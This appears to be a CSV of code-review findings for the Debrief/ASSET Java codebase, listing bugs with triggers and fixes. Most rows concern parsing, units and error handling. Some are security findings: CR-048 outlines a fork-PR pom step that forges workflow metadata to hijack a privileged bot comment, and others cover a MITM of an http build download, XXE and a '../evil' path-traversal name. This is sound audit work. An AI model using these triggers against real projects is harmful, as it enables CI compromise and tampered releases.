id,slice,plugin,package,class,file_path,category,issue_type,severity,confidence,status,title,description,instances,trigger_input,suggested_fix,effort,llm_value,related,github_issue
CR-038,A8,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,ParticipantVariance,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/ParticipantVariance.java,algorithm-correctness,nondeterminism,High,High,candidate,"Random course and random location use Math.random(), bypassing the seeded Ran...","applyRandomCourse sets Course = Math.random()*360 (L290) and applyDistributionArea calls WorldArea.getRandomLocation() (L244), which itself uses Math.random() (MWC/GenericData/WorldArea.java L717-L719). ScenarioGenerator.doScenarioGeneration seeds only RandomGenerator (ScenarioGenerator L893-L895), so generated scenario sets are not reproducible from the RandomSeed attribute. Also 'isMonte == """"' (L346) is a string reference comparison.",L244; L290; L346,Control file with RandomSeed=7 and a ParticipantVariance with RandomCourse=true or inRandomLocations=true; regenerate twice and diff the output scenario files.,Use RandomGenerator.nextRandom() for course and add a seeded variant of WorldArea.getRandomLocation (or generate lat/long here with RandomGenerator); use isEmpty().,S,Requires knowing which RNG the seed applies to; grep for Math.random finds candidates but not the seed linkage.,-,
CR-039,A9,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReader,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReader.java,algorithm-correctness,locale-parsing,High,High,verified,readThisDouble silently truncates comma-decimal and garbage-suffixed numbers,"readThisDouble parses with a Locale.UK DecimalFormat first and only falls back to the comma (FRANCE) format on ParseException. DecimalFormat.parse is a prefix parser: it never throws for '22,5', '12.5abc', '1e5' or '22 10', so the comma fallback is unreachable and the value is silently truncated (verified with JDK 21: '22,5'->22.0, '239,9'->239.0, '1e5'->1.0, '12.5abc'->12.5). Every REP line importer (ImportFix lat/lon/course/depth, sensors, TMA, shapes) relies on this helper, so a European-formatted REP file yields wrong positions/courses with no error.",L153-L163; L222-L241,"REP fix line '951212 051600 NELSON @C 22 10 53,54 N 21 45 14,20 W 239,9 2.0 0' (comma decimals) imports as 53 s / 14 s / 239 deg with no warning","Parse with ParsePosition and require pos.getIndex()==trimmed.length(); if the UK parse does not consume the whole token, try the comma format, else throw ParseException. Alternatively use Double.parseDouble after normalising the decimal separator.",S,Requires knowing DecimalFormat.parse prefix semantics and tracing that the comma fallback branch is dead; not grep-able.,-,
CR-040,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Antares,ImportAntaresImpl,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Antares/ImportAntaresImpl.java,algorithm-correctness,unit-mismatch,High,High,candidate,Antares course (degrees) and speed (knots) stored raw as Fix radians / yards-...,"loadThisLine parses course, speed and depth with Double.parseDouble and passes course and speed straight into new Fix(date, location, course, speed). Fix stores course in radians and speed in yards/sec (every other importer converts, e.g. ImportFix L846-847 Degs2Rads/Kts2Yps). A course of 30 in the file becomes 30 rad (=1718 deg mod 360 = 278 deg) and 2 kts becomes 2 yps (=3.55 kts). ImportAntaresTest L72-74 asserts fixWrapper.getCourse()==30 and getFix().getSpeed()==2, enshrining the wrong units.",L156-L171,'TRACK/010530Z/2512.0N-03010.5W/30/2/-5//' imports with course 278.3 deg and speed 3.55 kts,"Convert: Conversions.Degs2Rads(course) and Conversions.Kts2Yps(speed) (confirm file units with the format spec), and fix the unit test expectations.",S,Requires knowing the Fix constructor's unit contract; the code compiles and tests pass.,-,
CR-041,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.FlatFile,NMEA_Radar_FileImporter,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/FlatFile/NMEA_Radar_FileImporter.java,bug,time-handling,High,High,verified,"Radar log timestamps parsed with 12-hour 'hh': PM records dropped, noon recor...","getDate builds a non-lenient GMTDateFormat('yyMMdd_hhmmss'); 'hh' is the 1-12 clock-hour field. Verified on JDK 21: '700101_130601' and '700101_000601' throw ParseException (readLine returns Optional.empty and the record is silently dropped, only System.out), while '700101_120601' parses as 00:06:01, i.e. noon records are placed 12 hours early. Any $RATTM log covering 12:00-23:59 or 00:00-00:59 loses or misplaces contacts.",L330-L333; L351; L364-L367,"Radar log line '700101_130601:$RATTM,002,0.665,224.7,T,0.17,31.2,R,0.16,99.99,N,,T,,,A*2A' is rejected; '700101_120601:...' is stored at 00:06:01",Use pattern 'yyMMdd_HHmmss'. Also report skipped lines through the ErrorLogger instead of System.out.,S,Requires knowing SimpleDateFormat hh vs HH semantics with lenient=false; a regex grep would not flag it.,-,
CR-042,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Nisida,ImportNisida,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Nisida/ImportNisida.java,bug,locale-parsing,High,High,verified,UNIT month parsed with default-locale SimpleDateFormat('MMMyy'); non-English ...,"importThis creates new SimpleDateFormat('MMMyy') with the platform default locale (also default time zone). Verified: with Locale.GERMANY 'MAR20' and 'OCT20' throw ParseException. processUnit then only appends an error and leaves status.year/month at 0, and parseTimestamp (L362-366) builds every subsequent timestamp from year 0 / month 0, so all fixes, contacts and narratives get bogus dates while the import 'succeeds'. Separately, timestamps carry day-of-month only, so a report spanning a month boundary rolls back a month (L365).",L253; L801-L812; L362-L366,NISIDA file starting 'UNIT/ADRI/OCT20/...' opened on a JVM with a German or French default locale,"Use new SimpleDateFormat('MMMyy', Locale.ENGLISH) with GMT time zone, and abort (or refuse to create fixes) when the UNIT date failed to parse.",S,"Locale-default SimpleDateFormat is grep-able, but the year-0 silent consequence needs the state flow.",-,
CR-043,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Replay,ImportNarrative,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Replay/ImportNarrative.java,bug,silent-data-loss,High,High,candidate,Exported ;NARRATIVE: lines omit the track name (return value of exportTrackNa...,"exportThis calls ImportFix.exportTrackName(theEntry.getTrackName(), line) but ignores its return value, so the written line is ';NARRATIVE: <dtg> <entry text>' with no track column. On re-import readThisLine (L289-292) consumes the first word of the entry text as the track name, so every exported narrative loses its source track and the first word of its text. ImportNarrative2 (L358) does it correctly.",L237-L252,Export a narrative layer to REP (clipboard) and re-import: entry 'Contact regained' on track NELSON becomes track 'Contact' with text 'regained',"Assign the result: line = ImportFix.exportTrackName(theEntry.getTrackName(), line);",S,"Discarded-return-value on a String-building helper; CodeQL might flag unused return value, but the data-loss consequence needs the reader side.",-,
CR-044,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.Replay,ImportReplay,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Replay/ImportReplay.java,bug,silent-data-loss,High,High,candidate,"Malformed REP lines are silently dropped: line importers return null, readLin...","Most per-line importers catch ParseException, write to Trace and return null (ImportFix L881-884, ImportSensor L350-353, ImportSensor2 L338-341, ImportTMA_Pos L371-374, ImportTMA_RngBrg L341-344, ImportCircle L237-240, ImportRectangle L298-301, ImportLabel L233-236, ImportPolygon L540-543, ImportWheel L249-252, ImportBearing L263-266). ImportReplay.readLine then falls through every instanceof branch for a null object and returns null, so a fix/sensor/TMA line with an unparseable numeric field vanishes from the imported track with no dialog, no line number and no count; the user sees a track with silently missing fixes. Only NumberFormat/NoSuchElement/Parse exceptions that escape the line importer reach the readError dialog (L1618-L1630), giving inconsistent behaviour between fields (e.g. speed uses Double.valueOf and aborts, latitude uses readThisDouble and is dropped).",L2203-L2217; L2222-L2349; L1618-L1630,"REP file with one fix line whose latitude seconds field is 'x' among 1000 good lines: import completes, one fix missing, no error shown",Make readLine treat a null result from a recognised importer as an error: count it and surface the line number via readError/handleException (or collect a summary of skipped lines shown at end of import).,M,Needs tracing the null-return contract across ~12 importer classes and the readLine dispatch; grep finds 'return null' but not that the caller drops it silently.,-,
CR-045,A9,org.mwc.debrief.legacy,Debrief.ReaderWriter.ais,AISParser,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/ais/AISParser.java,bug,null-deref,High,High,candidate,"AISParser.parse returns raw null for out-of-sequence multipart fragment, NPE ...","parse() returns Optional<IAISMessage> everywhere except L228, where an out-of-order or orphan multi-sentence fragment returns bare null. ImportAIS.importThis calls oRes.isPresent() on the result (ImportAIS L305-306) and throws NullPointerException, aborting the whole import. AIS logs very commonly start mid-message or drop fragments, so this is triggered by ordinary capture files.",L225-L229; L192-L259,"AIS log whose first line is a second fragment, e.g. '!AIVDM,2,2,3,B,88888888880,2*25' (valid checksum) followed by normal position reports",Return Optional.empty() at L228 and log the discarded fragment with the line number.,S,"grep-able (return null in Optional-returning method), but the crash needs the caller's isPresent() call to be linked.",-,
CR-046,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,InterpolateTrack,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/InterpolateTrack.java,bug,silent-data-loss,High,High,candidate,Resample replaces all original fixes and Undo leaves the track empty,"execute() resamples from start+interval to <end (so the original first and last fixes are never regenerated), then clearPositions() discards every original fix and adds only the interpolated ones; original positions are never remembered. undo() removes only the interpolated fixes and sets _newFixes to null, so after Undo the track has no positions at all, and a second undo would NPE on _newFixes.",L84-L85; L90-L91; L113-L119; L134-L141,"Outline right-click on any TrackWrapper -> Resample position data -> 1 Min, then Edit -> Undo",Snapshot the original FixWrapper collection (per segment) before clearPositions() and restore it in undo(); also keep the original start/end fixes or extend the loop to <= endTime.,M,Needs reasoning about what undo must restore versus what execute discarded; not a pattern a linter flags.,-,
CR-047,A10,org.mwc.debrief.core,org.mwc.debrief.core.ContextOperations,SplitTracksIntoLegs,org.mwc.debrief.core/src/org/mwc/debrief/core/ContextOperations/SplitTracksIntoLegs.java,bug,degenerate-input,High,High,candidate,Undo of split throws IndexOutOfBounds when any selected track had no jumps,"execute() stores newSegments for every track including empty lists (L92-L94, L190-L192). undo() takes splits.get(0) as the merge target without checking emptiness, so an empty list throws IndexOutOfBoundsException and the remaining tracks are never restored; the undo operation is left half-applied in the history.",L92-L94; L113-L116; L190-L192; L211-L214,"Select two tracks, one with a >1 minute gap and one continuous; Split tracks into segments on gaps over 1 Minute; then Undo",Skip tracks whose split list is empty (or do not store them) in both SplitTracksOperation.undo and SpatialSplitTracksOperation.undo.,S,Requires connecting execute's storage of empty lists to undo's unconditional get(0).,-,
CR-048,A11,.github,-,pr-build-comment.yml,.github/workflows/pr-build-comment.yml,security,logic-error,High,High,candidate,pr-meta validation lets a fork PR steer the write-token comment onto any PR,"Real type: insufficient validation of untrusted workflow_run artifact. The job runs with `pull-requests: write` (L24) and reads pr-meta/meta.env (L69-77), which is produced in main.yml AFTER `mvn clean verify` executed the fork's poms on the same runner (main.yml L174-179 then L282-290), so every byte of it is attacker-controlled. The only guard on `pr` is `Number.isInteger(prNumber) && prNumber > 0` (L79-83); nothing ties it to the run (`github.event.workflow_run`). The sticky-comment logic (L177-187) then updates the existing github-actions[bot] comment containing MARKER on that issue, so an attacker replaces a legitimate PR's 'Review builds' comment with links to binaries built from their own fork. `meta.build` (L91-96) is equally untrusted, so a failed build can be presented as `success`.",L24; L56-83; L91-96; L177-187,"Fork PR whose pom.xml antrun execution runs `printf 'pr=123\nsha=<40hex>\nbuild=success\n' > $GITHUB_WORKSPACE/pr-meta/meta.env` after the real step, or simply replaces /usr/bin/bash via passwordless sudo; the comment on PR #123 is rewritten to point at the attacker's Windows zip.","Do not trust `pr` from the artifact: resolve the PR via `github.rest.pulls.list({head: run.head_repository.full_name+':'+run.head_branch})` (or `repos.listPullRequestsAssociatedWithCommit(run.head_sha)`) and require `pull.head.sha === run.head_sha`; derive `built` from `run.conclusion`, not meta.build.",S,Requires following the data flow from the untrusted build step through the artifact into the privileged workflow and noticing the integer check does not bind the number to the run; no grep/CodeQL rule expresses this.,-,
CR-049,A11,root,-,install-msitools.sh,install-msitools.sh,supply-chain,ssrf-or-unvalidated-url,High,High,candidate,Release job downloads msitools over plain http and runs sudo make install,"L3 fetches http://ftp.gnome.org/pub/GNOME/sources/msitools/0.100/msitools-0.100.tar.xz with no TLS and no checksum/signature check, L5 compiles it and installs as root. It runs only in main.yml's `build installer` step (L196-215) on tag builds, i.e. on the very runner that holds the `contents: write` GITHUB_TOKEN (L88-89) and later uploads the release (L310-324). A network MITM of the cleartext fetch gets root on the release runner and can replace every release asset. ftp.gnome.org is also decommissioned (redirects to download.gnome.org), so the fetch depends on a redirect from an unauthenticated origin.",L3-5; .github/workflows/main.yml L196-215,Push a release-shaped tag while an on-path attacker answers the http GET for msitools-0.100.tar.xz with a tarball whose Makefile installs a trojaned wixl.,"Use https://download.gnome.org/... , pin the tarball SHA-256 and check it with sha256sum -c before extracting, or install the distro `msitools`/`wixl` package (available in Ubuntu 24.04) instead of compiling.",S,"grep-able for http://, but ranking it needed the workflow read to see it runs on the release runner with the write token.",-,
CR-050,A1,org.mwc.asset.ScenarioController2,org.mwc.asset.scenariocontroller2,CoreControllerPresenter,org.mwc.asset.ScenarioController2/src/org/mwc/asset/scenariocontroller2/CoreControllerPresenter.java,security,xxe,Medium,High,candidate,Dropped file sniffed with unhardened DocumentBuilder and parsed as a URI,"getFirstNodeName() fully parses any file dropped onto the scenario controller with a default DocumentBuilderFactory (entities and DTDs enabled) just to read the root element name; it also passes the raw path to builder.parse(String), which treats it as a URI, so paths containing '#' or '%' fail. SAXException is not caught and propagates as Exception.",L124-L140,Drop a control file containing a DOCTYPE with an external entity onto the Scenario Controller view,"Harden the factory (secure processing, disallow-doctype-decl) and parse via new File(path) or a FileInputStream; consider a streaming StAX peek that stops at the first START_ELEMENT.",S,grep-able,CWE-611,
CR-051,A1,org.mwc.asset.ScenarioController2,org.mwc.asset.scenariocontroller2,MultiScenarioPresenter,org.mwc.asset.ScenarioController2/src/org/mwc/asset/scenariocontroller2/MultiScenarioPresenter.java,bug,null-deref,Medium,High,candidate,Control-file load failure leaves _scenarioController null and is then derefer...,"importThisControlFile() failures are caught and logged but execution continues to _scenarioController.observerList and isRelativePath(tgtDir), so a malformed control file produces an NPE in the UI thread rather than an error message; importThisControlFile also returns null when the file has no ScenarioController element, and outputDirectory is null when the attribute is absent (NPE in isRelativePath at thePath.length()). The controlType dispatch at L534-L535 compares Strings with == and relies on interning.",L526-L558,"Drop an .xml control file with a syntax error, or one lacking OutputDirectory, onto the Multi Scenario view",Return after logging when import fails or the container/directory is null; use equals() for the type comparison.,S,Needs following the caught-exception path into the following statements.,CoreControllerPresenter L148-L170,
CR-052,A1,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,ScenarioGenerator,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/ScenarioGenerator.java,bug,locale-parsing,Medium,High,candidate,Generated XML re-encoded through the platform default charset,"writeToString() serialises with a Transformer (UTF-8 output by default) into a ByteArrayOutputStream and then calls bos.toString() (platform charset); writeTheseToFile() writes the resulting String with FileWriter (platform charset again). On a non-UTF-8 default locale any non-ASCII text in the scenario is corrupted while the file still declares encoding=""UTF-8"", so the generated scenarios fail to parse or contain mojibake.",L539-L562; L564-L587; L1000-L1003; L1041-L1049,"Template with participant name containing an accented character, generated on a Windows cp1252 machine",Use bos.toString(StandardCharsets.UTF_8) and write with an OutputStreamWriter in UTF-8 (or stream the Transformer directly to the file).,S,grep-able,SupportTesting L170-L192 same pattern,
CR-053,A1,org.mwc.asset.legacy,ASSET.Util.MonteCarlo,ScenarioGenerator,org.mwc.asset.legacy/src/ASSET/Util/MonteCarlo/ScenarioGenerator.java,bug,null-deref,Medium,High,candidate,readDocumentFrom returns null on parse failure; callers dereference it,"readDocumentFrom(InputSource) catches SAXException/IOException, prints the stack trace and returns null; readDocumentFrom(InputStream) does the same for IOException. validateThisDocument() then calls getIt.getNodeType() on the null (NPE instead of the intended error string) and contains the no-op 'scrapNodeType = scrapNodeType++'. Other callers of readDocumentFrom in the Monte Carlo code receive null documents on malformed input.",L477-L490; L495-L506; L515-L533,Run scenario generation with a scenario template that is not well-formed XML,Let the exceptions propagate (or wrap them in a checked ImportException) and remove the dead scrapNodeType code.,S,grep-able,-,
CR-054,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReader,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReader.java,bug,thread-safety,Medium,Medium,candidate,Shared static SimpleDateFormat/DecimalFormat instances used without synchroni...,"_XMLDateFormat and RNdateFormat are lazily created static SimpleDateFormats (creation is synchronized but use is not): HandleDateTimeAttribute.setValue() calls getXMLDateFormatter().parse() and writeThis(Date)/writeThisInXML() call format() concurrently. DebriefFormatDateTime.toString() likewise uses static _df/_dfMillis unsynchronised (only parseThis is synchronized). Eclipse loads dropped files in parallel Jobs and autosave can run while an import is in progress, and SimpleDateFormat corrupts results silently under concurrent use.",L81; L143-L148; L199-L212; L289-L291; L322-L324,"Drag two .dpf files onto an open plot simultaneously, or save while a large import is running",Use java.time DateTimeFormatter (immutable) or ThreadLocal formatters; same for DebriefFormatDateTime._df/_dfMillis and MWCXMLReader shortFormat/longFormat.,S,Needs knowledge that SimpleDateFormat is not thread-safe plus the concurrent-job context; a grep finds the statics but not the unsynchronised use sites.,-,
CR-055,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML,MWCXMLReader,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/MWCXMLReader.java,algorithm-correctness,time-handling,Medium,High,candidate,DTG round-trips through a two-digit-year format,"writeThis(HiResDate) delegates to DebriefFormatDateTime.toStringHiRes(), which formats with 'yyMMdd HHmmss'; parseThis() reads it back with the same two-digit pattern, so SimpleDateFormat's sliding 80/20 window decides the century. Any dataset dated before ~1946 or after ~2046 (historical reconstructions, far-future exercise dates) is silently shifted by 100 years on save/load, and the shift point moves every year the software is run.",L214-L216; L309-L312,Save a plot containing a fix dated 1940-05-26 and reopen it: the fix loads as 2040-05-26,Write a four-digit year (yyyyMMdd) on export; parseThis already accepts it (spaceIndex > 6 branch).,S,Required tracing writeThis(HiResDate) into DebriefFormatDateTime and knowing SimpleDateFormat's yy window semantics.,-,
CR-056,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,ColourHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/ColourHandler.java,bug,string-parsing,Medium,High,candidate,Custom colour components unvalidated; out-of-range or non-numeric values abor...,"handleOurselves() parses CustomRed/Green/Blue with Integer.valueOf outside any try/catch, and elementClosed() calls new Color(_r,_g,_b), which throws IllegalArgumentException for values outside 0-255; either exception propagates out of the SAX callbacks and fails the whole file. _setColour compares against 'CUSTOM' while exportColour writes 'custom', so that branch is dead. fromString() has the same unguarded parseInt.",L96-L103; L141-L162; L164-L177; L180-L201,"<colour Value=""custom"" CustomRed=""300"" CustomGreen=""0"" CustomBlue=""0""/> in a track element","Clamp/validate components, catch NumberFormatException and fall back to a default colour with a warning.",S,grep-able for the parses; the Color range check needs API knowledge.,-,
CR-057,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,DurationHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/DurationHandler.java,bug,null-deref,Medium,High,candidate,Missing Units attribute causes NPE; unknown units silently become microseconds,"elementClosed() calls Duration.getUnitIndexFor(_units) where _units is null when the Units attribute is absent, throwing NPE (rethrown by MWCXMLReader.endElement and aborting the import). When Units is present but not one of the exact labels, getUnitIndexFor returns 0 (micros), so 'Hours' or 'hrs' silently loads a 2-hour duration as 2 microseconds. WorldSpeedHandler/BaseDataHandler have the identical pattern (index 0 = m/s).",L59-L71; L43-L57,"<Duration Value=""2"" Units=""Hours""/> in a .dpf planning segment, or <Duration Value=""2""/>",Default _units sensibly or reject the element; make unit lookup case-insensitive and fail on unknown labels.,S,Needs following the null into getUnitIndexFor and understanding the 0-index default.,WorldSpeedHandler L44-L54; BaseDataHandler L64-L69,
CR-058,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,LongLocationHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/LongLocationHandler.java,bug,string-parsing,Medium,High,candidate,longLocation attributes parsed with unguarded valueOf/charAt and lossy minute...,"Integer.valueOf/Float.valueOf/charAt(0) are called directly on attribute text with no try/catch and outside the base-class guard (handleOurselves is overridden), so a malformed or empty value throws NumberFormatException/StringIndexOutOfBounds through the SAX parser and aborts the whole import. In elementClosed() fractional minutes are only converted to seconds when _latSec == 0 (float equality), and the constructor is then given (int)_latMin, so 'LatMin=30.5 LatSec=10' silently drops the half minute.",L40-L52; L55-L86,"<longLocation LatDeg=""50"" LatMin=""30.5"" LatSec=""10"" LatHem="""" .../>","Wrap parsing in try/catch with a clear error, validate hemisphere length, and always add the fractional minutes to the seconds.",S,Needs reasoning about the float-equality branch and the (int) truncation together.,-,
CR-059,A1,org.mwc.cmap.legacy,MWC.Utilities.ReaderWriter.XML.Util,WorldDistanceHandler,org.mwc.cmap.legacy/src/MWC/Utilities/ReaderWriter/XML/Util/WorldDistanceHandler.java,bug,string-parsing,Medium,High,candidate,extractWorldDistance parses a double attribute with Integer.parseInt; unknown...,"exportDistance() writes Value with writeThisLong ('0.0000000'), but the DOM helper extractWorldDistance() reads it with Integer.parseInt, so every exported value throws NumberFormatException (used by ASSET LocationOffset). In the SAX path an unrecognised Units label is passed to WorldDistance.getUnitIndexFor(), which returns 0 (metres) for anything it does not recognise, so e.g. 'NM' or 'nmi' silently loads a nautical-mile distance as metres; a missing Value leaves -1.",L34-L47 (extract); L75-L87 (elementClosed),"Monte-Carlo template with <LocationOffset><WorldDistance Value=""1.0000000"" Units=""nm""/></LocationOffset>, or a hand-edited .dpf using Units=""NM""",Parse with readThisDouble; make getUnitIndexFor return -1/throw for unknown labels and treat that as an import error.,S,Needs cross-checking the export format against the import parse and the semantics of getUnitIndexFor.,ASSET.Util.MonteCarlo.LocationOffset L97,
CR-060,A1,org.mwc.debrief.core,org.mwc.debrief.core.loaders.xml_handlers,DebriefEclipseXMLReaderWriter,org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/xml_handlers/DebriefEclipseXMLReaderWriter.java,bug,swallowed-exception,Medium,Medium,candidate,Save errors are logged but not reported; partially written .dpf looks like a ...,"exportThis()/outputContent() catch DOMException, ParserConfigurationException and TransformerException, log them and return normally. The Transformer may already have written part of the document to the OutputStream, so the plot file on disk is truncated/invalid while the caller (PlotEditor save) receives no exception and cannot mark the editor dirty or warn the user. The same pattern exists in the legacy DebriefXMLReaderWriter.",L46-L61; L72-L86; L94-L110,"Export of a layer whose exporter throws DOMException (e.g. an attribute value containing an illegal XML character), or a disk-full TransformerException mid-write","Rethrow as an unchecked/IO exception so the save operation fails visibly, and write to a temp file then rename.",S,Needs reasoning about partial output already flushed to the stream before the catch.,Debrief.ReaderWriter.XML.DebriefXMLReaderWriter L43-L111,
CR-061,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,bug,locale-parsing,Medium,High,candidate,"KML bytes decoded with platform default charset, ignoring the XML encoding de...","inputStreamAsString() wraps the stream in InputStreamReader with no charset, so a UTF-8 KML (the KML standard) is decoded as cp1252 on Windows before being handed to the parser as a String; non-ASCII track names are corrupted and a UTF-8 BOM/degree sign may then be stripped by stripNonValidXMLCharacters. Track names for LineString data come from Date.toString() (default locale and timezone).",L162-L168; L306-L318; L346,UTF-8 KML with <name>Frégate-1</name> opened on a Windows machine with cp1252 default,"Pass the InputStream (or a byte array) directly to DocumentBuilder.parse so the parser honours the encoding declaration; if pre-filtering is required, decode as UTF-8 explicitly.",S,Needs knowing XML encoding detection is bypassed once the bytes are turned into a String.,-,
CR-062,A1+A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,bug,swallowed-exception,Medium,High,candidate,Import failures only printStackTrace; static mutable state shared across imports,"All caught exceptions (parser config, SAX, IO, ParseException) go to printStackTrace, so a malformed KML results in an empty or partial import with no user-visible message. lastLayer/colorCounter are static mutable fields written during import (and lastLayer is only cleared on the normal path), so two concurrent KML loads can append fixes to each other's tracks. LineString points are assigned fabricated timestamps at 1-second steps (DEFAULT_TIME_STEP) with nothing marking them as synthetic. || doZipImport() catches IOException (truncated/corrupt zip, wrong password, CRC error) and only printStackTrace()s; the loader completes as if successful and the plot is left unchanged with no user-visible message. The ZipInputStream is also never closed.",L60-L71; L84-L97; L256-L269; L329-L354; L300-L302,Truncated .kml file dropped onto a plot: nothing appears and no dialog is shown,Propagate a PlainImporter.ImportException so the loader shows the standard error dialog; make lastLayer/colorCounter locals or instance fields.,S,grep-able,-,
CR-063,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.Tactical,FixHandler,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/Tactical/FixHandler.java,bug,null-deref,Medium,High,candidate,Fix with unparseable/missing Dtg or centre is added and crashes the import,"The Dtg handler catches ParseException and leaves _theFix.time null (parseThis also returns null for the NULL date string); elementClosed() still calls addPlottable(), and TrackSegment.addFixSilent -> FixWrapperCollisionCheck.correctTimeCollision dereferences getTime().getMicros(), so one bad fix aborts the whole plot with 'Parse Error: null'. A fix without a centre element likewise NPEs in TrackWrapper.addFix when extending _myWorldArea. Course wrap at L141-L144 also only adds 360 once.",L136-L149; L164-L173; L176-L181; L239-L246,"<fix Dtg=""garbage"" Course=""0"" Speed=""0""><centre><shortLocation Lat=""1"" Long=""1"" Depth=""0""/></centre></fix>",In elementClosed() skip (and report) fixes whose time or location is null rather than adding them.,S,"Needed to trace the null across FixHandler, TrackSegment and FixWrapperCollisionCheck.",-,
CR-064,A1,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.extensions,TimeSeriesDoubleHandler,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/extensions/TimeSeriesDoubleHandler.java,bug,silent-data-loss,Medium,High,candidate,Index and value lists desynchronise when one measurement attribute fails to p...,"Each Item element appends Index to _indices and Value to _values independently; Long.parseLong/Double.parseDouble exceptions are swallowed by MWCXMLReader.handleOurselves, so a single bad Value leaves _indices one longer than _values and every subsequent measurement is silently attributed to the wrong time. TimeSeries2DoubleHandler has the same structure with two value lists.",L37-L55,"<Item Index=""1000"" Value=""n/a""/> followed by valid items in a MeasuredData dataset",Parse both attributes into locals in handleOurselves and add the pair atomically (or skip the item) when both parse.,S,Requires understanding the swallowing in the base class combined with two parallel lists.,TimeSeries2DoubleHandler L41-L58,
CR-065,A2+A10,org.mwc.debrief.core,org.mwc.debrief.core.operations,ExportDopplerShift,org.mwc.debrief.core/src/org/mwc/debrief/core/operations/ExportDopplerShift.java,security,path-traversal,Medium,High,candidate,Output filename built from unsanitised primary track name,"Same pattern as ExportToFlatFile: fileName = filePath + separator + primaryTrack.getName() + '_' + HOST_DATE + suffix, with the document-supplied track name unsanitised, allowing writes outside the chosen directory and silent failure on illegal characters. || fileName = filePath + separator + primaryTrack.getName() + '_' + date + '.csv'. The track name comes from the loaded .rep/.dpf and may contain path separators or '..', so the export writes outside the directory the analyst chose; filePath is also left null when the wizard page is incomplete, producing a relative 'null/...' path. ExportToFlatFile L208-L211 has the same construction.",L112-L116; L93; L106-L120,Track named '../evil' selected as primary when exporting Doppler shift.,Share one sanitise-and-confine helper with ExportToFlatFile.,S,grep-able,ExportToFlatFile.java L208-L211,
